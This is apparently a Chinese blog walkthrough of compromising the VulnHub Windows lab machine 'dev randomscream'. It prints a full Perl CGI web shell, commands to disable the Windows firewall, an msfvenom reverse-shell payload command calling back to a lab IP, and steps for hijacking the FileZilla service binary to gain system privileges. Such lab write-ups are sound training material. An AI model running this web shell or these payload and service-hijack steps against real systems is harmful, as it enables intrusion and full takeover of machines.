+++
ShowToc = true
TocOpen = true
title = '0x076 dev randomscream'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



头一次打vulnhub的windows靶机，不太好配置啊：

# 端口扫描

![](/vulnhub_img/WEBRESOURCE87c4b538a137954d0474da79f0056849image.png)

![](/vulnhub_img/WEBRESOURCEa7bae8babbd95b78240e721eb612bd8bimage.png)

# 渗透

先看FTP：

![](/vulnhub_img/WEBRESOURCE9be74f55b58760de31ce413d42cca90aimage.png)

文件挺多的，但是都没读取权限：

![](/vulnhub_img/WEBRESOURCE9ecabaa1a20e5ca5f13be81ccd76b31fimage.png)

80端口也没扫出东西，这个root可能是80端口，然后看一下UPD的TFTP：

随便尝试了一下：

![](/vulnhub_img/WEBRESOURCE448020f7c8cf5c4aea20af6e81095a10image.png)

但是php反弹shell失败了，可能没有PHP的环境：

![](/vulnhub_img/WEBRESOURCE6c4c7f225f482364f45c161a3fa3ca44image.png)

这里查了一些资料，cgi程序：

![](/vulnhub_img/WEBRESOURCE00273facdd56f5b7ef383221571d8e06image.png)

![](/vulnhub_img/WEBRESOURCEff2c4b45f24113084178074905020a9cimage.png)

这些语言都可以实现，然后，poc如下：

```
use CGI;
use Cwd;
print CGI::header( -type => 'text/html' );
my $command = CGI::param('command');
my $pwd = CGI::param('pwd') || '';
my $password = CGI::param('password');
my $filename = CGI->script_name() ;

if ( $password ne 'yourpassword' ) {
    print "Please provide a valid password.\n";
    exit(0)
}

$pwd = $pwd eq '' ? `pwd` : $pwd;
my $home = Cwd::cwd();
chdir($pwd);

my $result='';

if ($command =~ /^cd\s*(.*)/) {
  my $dir = $1 or '';
  if ($dir eq '') {
    chdir($home);
  } else {
    chdir($dir);
  }
  $pwd = Cwd::cwd(); 
  $result = `ls -la`;
} else {
  $result = `$command`;
}

print <<EOF;
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
<meta content="text/html; charset=ISO-8859-1" http-equiv="content-type"><title>console</title>
<script>
window.onload = function(){
        document.getElementById("command").focus();
        }

</script>
<style type="text/css">
.wide1 {
border-width: thick;
width: 100%;
height: 600px;
}
.wide2 {
setFocus;
border-width: thick;
width: 100%;
}
</style>
</head><body>
<p>
Script: $filename PWD: $pwd <br/>
<textarea class="wide1" readonly="readonly" cols="1" rows="1" name="result">
$result
</textarea></p>
<form method="get" action="$filename" name="command">Command:&nbsp;
<input class="wide2" name="command" id="command"><br>
<input name="password" value="$password" type="hidden">
<input name="pwd" value="$pwd" type="hidden">
</form>
<br>
</body></html>
EOF

exit 0;
```

使用方式：

![](/vulnhub_img/WEBRESOURCEca9908bc2110e591604f0f1cc23f6231image.png)

查看防火墙状态：

```
netsh firewall show state
```

关闭防火墙：

```
net stop sharedaccess
sc config sharedaccess status= disable
```

![](/vulnhub_img/WEBRESOURCE1bb0dd1611e8e849a5f695a4531ddc42image.png)

![](/vulnhub_img/WEBRESOURCE81f72ac8287e468ba005f63de5c41bfaimage.png)

上传nc.exe，反弹shell：

![](/vulnhub_img/WEBRESOURCEd49c2ea128ddd72a9f7541ea30ef5887image.png)

![](/vulnhub_img/WEBRESOURCEbffe235cfd11a80ac519215e61870c1dimage.png)

# 提权

windows单机提权确实比较少：

tasklist /V查看进程信息：

![](/vulnhub_img/WEBRESOURCE097209197bac6dc42109f59046d31c9aimage.png)

net start查看服务列表：

![](/vulnhub_img/WEBRESOURCE2ac8d11ed1995f05c9d1615504ac9cd5image.png)

dir /s | findstr "FileZilla server.exe"

查询FileZilla server.exe文件：

![](/vulnhub_img/WEBRESOURCE8e0c1efebf6bb3de3b4ea3fef4715c9aimage.png)

生成木马，上传：

这种格式的木马可以直接用NC监听：

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.5.66 LPORT=8889 -f exe > reverse_sys_tcpshell.exe
```

![](/vulnhub_img/WEBRESOURCE8d1c7a2c8ab045436d83b1e9c92a423dimage.png)

记得改成binary

![](/vulnhub_img/WEBRESOURCEf2447ad16b2bb8da5925d4ea317e1b57image.png)

停止服务：

net stop "FileZilla Server FTP server"

![](/vulnhub_img/WEBRESOURCEf0ac952f59bed484ec18f4d2ce103eceimage.png)

覆盖服务：

![](/vulnhub_img/WEBRESOURCE9493d9cc2aec523dd6b54f9c3b6eadedimage.png)

开启监听，然后启动服务：

net start "FileZilla Server FTP server"

![](/vulnhub_img/WEBRESOURCE523cb1dcfb483fe1f9a7869787b6d80aimage.png)

![](/vulnhub_img/WEBRESOURCEd61176b54cab97e1686adcabf6f1f1f2image.png)

运行不了whoami，只能通过这种进程的方式来证明权限：

![](/vulnhub_img/WEBRESOURCEca6d440140c94f45f82614dd08cee018image.png)